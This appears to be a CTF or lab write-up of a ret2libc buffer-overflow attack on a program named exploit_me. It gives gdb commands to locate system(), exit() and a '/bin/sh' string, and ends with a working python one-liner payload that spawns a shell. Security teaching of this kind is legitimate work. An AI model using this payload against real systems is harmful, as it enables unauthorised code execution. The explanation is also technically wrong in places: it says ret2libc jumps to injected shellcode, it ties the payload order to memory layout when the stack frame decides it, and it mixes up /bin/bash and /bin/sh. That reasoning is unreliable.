# ret2libc attack

The main function utilizes the unsafe <code>strcpy()</code> function, which is vulnerable to buffer overflow attacks. There is no direct <code>system()</code> call, so we may need to find our own way to access it. This situation is commonly referred to as a <code>return to libc</code> attack, where the overflow overwrites the return address with the memory address of the injected shellcode. Upon returning from the function, instead of jumping to the legitimate address, it redirects execution flow to the shellcode. There are 3 prerequisites for planning this type of attack:
- <code>system()</code> - which allows executing shell commands
- <code>exit()</code> - used to terminate the program after executing the shell command
- <code>/bin/bash</code> - which is passed as an argument to <code>system()</code> to spawn a shell

``` shell
overflow --EXPLOIT--> system() --> exit() --> /bin/bash
```
To find the offset, we can use an online tool ([Wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)). To find the addresses, we use <code>gdb</code>:
``` shell
(gdb) b main
(gdb) r
(gdb) p &system
(gdb) p &exit
(gdb) find &system, +999999999, "/bin/sh"
```

It might seem weird that the <code>/bin/bash</code> comes after <code>exit()</code>. When a program is compiled and linked, functions like <code>system()</code> and <code>exit()</code> from the libc are typically located before any static data such as strings. Therefore, the address of the <code>exit()</code> function usually comes before the address of the <code>/bin/bash</code> string in memory.

## exploit
The exploit is constructed using the addresses and overflow in the following order:
- Offset of 140 bytes.
- The three function addresses in little-endian format.
``` shell
./exploit_me $(python -c 'print "F"*140 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1]')
```
